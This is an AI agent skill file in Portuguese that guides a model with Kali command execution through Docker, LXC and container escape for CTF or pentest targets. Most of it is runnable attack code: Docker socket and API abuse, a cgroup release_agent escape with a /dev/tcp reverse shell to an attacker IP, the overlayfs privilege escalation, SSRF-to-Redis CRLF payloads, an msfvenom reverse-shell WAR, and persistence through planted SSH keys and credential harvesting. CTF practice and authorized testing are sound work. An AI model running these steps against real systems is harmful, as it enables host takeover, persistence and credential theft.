---
name: ctf-docker-escape
description: Use esta skill quando o usuário estiver dentro de um container Docker ou LXC em um CTF ou pentest e precisar escapar para o host, ou quando mencionar "docker escape", "container escape", "cgroup", "namespace", "privileged container", "docker socket", "cap_sys_admin", "/dev/sda", "LXC", "Kubernetes", "overlay filesystem", "AppArmor bypass", "cgroup release_agent", ou precisar de técnicas de container breakout.
argument-hint: [container-ip]
allowed-tools: [mcp__mcp-kali-server__execute_command]
---

# CTF Docker/Container Escape — Container Breakout Methodology

Esta skill implementa uma metodologia estruturada para escape de containers e breakout de ambientes isolados baseada em padrões de CTF e segurança.

## Passo 0 — Identificar se está em container

```bash
# Verificar ambiente
cat /proc/1/cgroup | head -5      # Contém "docker" ou IDs longos = container
ls /.dockerenv 2>/dev/null         # Arquivo existe = Docker
cat /etc/hostname                  # Hostname aleatório sugere container
ip addr | grep -v "127\|::1"       # Range de IP 172.17.x.x = Docker default bridge
env | grep -iE "docker|container|kube"

# Verificar capabilities disponíveis
capsh --print 2>/dev/null
cat /proc/self/status | grep -i cap

# Verificar se privilegiado
grep -qi "privileged" /proc/1/status 2>/dev/null
ls /dev/ | grep -E "sda|disk"      # Acesso a devices do host = privileged
```

## Fase 1 — Container com Docker Socket exposto

```bash
# Verificar se socket está montado
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# Se socket acessível: controle total do host!
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock images

# Montar filesystem do host em novo container privilegiado
docker -H unix:///var/run/docker.sock run -it \
  --privileged --pid=host --net=host \
  -v /:/host alpine chroot /host /bin/bash

# Alternativa: adicionar SSH key do root
docker -H unix:///var/run/docker.sock run -v /root:/mnt alpine \
  sh -c "echo 'ssh-rsa AAAA...' >> /mnt/.ssh/authorized_keys"

# API REST (se exposto em porta 2375/2376 sem TLS)
curl http://<HOST_IP>:2375/containers/json
curl -X POST "http://<HOST_IP>:2375/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

## Fase 2 — Container privilegiado (cap_sys_admin / --privileged)

### Método cgroups release_agent (HTB Ready):

```bash
# Verificar se é privilegiado
cat /proc/self/status | grep CapEff
# Se CapEff: 0000003fffffffff → completamente privilegiado!

# Passo 1: Criar e montar cgroup malicioso
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp || mount -t cgroup2 cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Passo 2: Habilitar release_agent
echo 1 > /tmp/cgrp/x/notify_on_release

# Passo 3: Definir release_agent para nosso script
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Passo 4: Criar script malicioso no caminho do host
cat > /cmd << 'EOF'
#!/bin/sh
ps aux > /output 2>&1
EOF
chmod +x /cmd

# Passo 5: Executar release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

**Versão para reverse shell:**
```bash
cat > /cmd << 'EOF'
#!/bin/sh
bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
EOF
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Montar disco do host (HTB Ready, Talkative):

```bash
# Listar dispositivos de bloco
fdisk -l 2>/dev/null
ls -la /dev/sd*
lsblk

# Montar disco do host
mkdir /mnt/host
mount /dev/sda2 /mnt/host  # ajustar device conforme lsblk
ls /mnt/host/root/          # root do host!

# Ler flag do host
cat /mnt/host/root/root.txt

# Escrever SSH key autorizada do host
echo 'ssh-rsa AAAA...' >> /mnt/host/root/.ssh/authorized_keys
chmod 600 /mnt/host/root/.ssh/authorized_keys
```

### nsenter — entrar no namespace do host:

```bash
# Se privilegiado, usar nsenter para entrar no PID namespace do host
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Alternativa:
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

## Fase 3 — Escape via cap_sys_admin + overlayfs

```bash
# Verificar capability
cat /proc/self/status | grep CapEff | xxd
# Calcular: capsh --decode=<CapEff_hex>

# overlayfs privilege escalation (dentro de user namespace)
# HTB Hospital / GameOverlay CVE-2023-2640:
unshare -rm sh -c "
  mkdir l u w m && cp /u*/b*/p*3 l/;
  setcap cap_setuid+eip l/python3;
  mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
  touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
```

## Fase 4 — GitLab SSRF → Redis → RCE → Container escape (HTB Ready)

```bash
# CVE-2018-19571: GitLab SSRF via import de projeto
# URL com IPv6 mapeado para bypass de localhost:
# http://[0:0:0:0:0:ffff:127.0.0.1]/

# CVE-2018-19585: CRLF injection via git:// URL
# git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%0D%0AMULTI%0D%0A...

# Payload Redis via CRLF para escrever authorized_keys:
# SLAVEOF NO ONE\r\nCONFIG SET dir /var/opt/gitlab/.ssh\r\n
# CONFIG SET dbfilename authorized_keys\r\n
# SET key "ssh-rsa AAAA..."\r\nSAVE\r\n

# Após RCE no container GitLab → escape via cgroups ou disco
```

## Fase 5 — Docker via Portainer/API web

```bash
# Portainer exposto (porta 9000/9443)
# Criar container privilegiado via interface web
# Volume: / → /host
# Privileged: true
# Command: chroot /host /bin/bash

# Ou via API Portainer com token
curl -X POST "http://portainer:9000/api/endpoints/1/docker/containers/create" \
  -H "X-API-Key: <TOKEN>" \
  -d '{"Image":"alpine","HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

## Fase 6 — LXC/LXD Escape (HTB Tabby, other)

```bash
# Verificar se usuário está no grupo lxd
id | grep lxd

# Passo 1: Baixar alpine image
wget http://<KALI>/alpine.tar.gz

# Passo 2: Importar imagem
lxc image import alpine.tar.gz --alias alpine

# Passo 3: Criar container privilegiado com disco do host
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc

# Passo 4: Executar
lxc exec privesc -- chroot /mnt/root /bin/bash
```

## Fase 7 — Ansible/Automation dentro de container

```bash
# Se Ansible runner está dentro do container e playbooks são editáveis (HTB Seal)
# Abusar synchronize module com copy_links=yes:
ln -s /etc/shadow /home/user/shadow_link
# O sync vai copiar o arquivo shadow como se fosse do usuário

# Injetar tarefa maliciosa em playbook
cat >> /opt/playbooks/site.yml << 'EOF'
    - name: privesc
      shell: "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
      become: yes
EOF
ansible-playbook /opt/playbooks/site.yml
/tmp/rootbash -p
```

## Fase 8 — WAR deploy (Tomcat → RCE no container)

```bash
# Bypass de autenticação Nginx→Tomcat (HTB Seal):
# Nginx normaliza /manager;name=x/html → Tomcat vê /manager/html
# Nginx checou auth só em /manager/html mas não em /manager;name=x/html
curl -u 'tomcat:pass' "http://target/manager;name=0xdf/html"

# Criar WAR malicioso
msfvenom -p java/shell_reverse_tcp lhost=<KALI_IP> lport=4444 -f war -o shell.war

# Upload e deploy
curl -u 'tomcat:pass' -T shell.war \
  "http://target/manager;name=0xdf/text/deploy?path=/shell"
curl "http://target/shell/"
```

## Fase 9 — Pós-escape: movimentação no host

```bash
# Após escape para o host:
# 1. Verificar outros containers rodando
docker ps  # se docker está instalado no host e socket exposto

# 2. Verificar interfaces de rede (outros segmentos de rede?)
ip route
ip addr
cat /etc/hosts

# 3. Persistência via SSH
cat ~/.ssh/id_rsa
echo '<OUR_SSH_PUB_KEY>' >> /root/.ssh/authorized_keys

# 4. Buscar credenciais de outros serviços
find /etc /opt /root -name "*.conf" -o -name "*.env" 2>/dev/null | xargs grep -l "pass" 2>/dev/null
docker inspect <CONTAINER_ID> | grep -i "env\|pass\|secret"
```

## Checklist do 0xdf para containers

```
[ ] cat /proc/1/cgroup → confirmar que está em container
[ ] ls /var/run/docker.sock → Docker socket exposto?
[ ] cat /proc/self/status | grep CapEff → cap_sys_admin?
[ ] ls /dev/sd* → acesso a discos do host?
[ ] id | grep -E "docker|lxd" → grupos privilegiados?
[ ] cat /etc/mtab → overlay filesystem paths
[ ] mount /dev/sda* /mnt → disco do host acessível?
[ ] cgroup release_agent attack (se cap_sys_admin)
[ ] nsenter -t 1 -m -u -i -n -p (se privilegiado)
[ ] Portainer exposta? → container privilegiado via GUI
[ ] GitLab? → CVE-2018-19571 SSRF → Redis
[ ] Tomcat? → WAR upload, /manager bypass
```
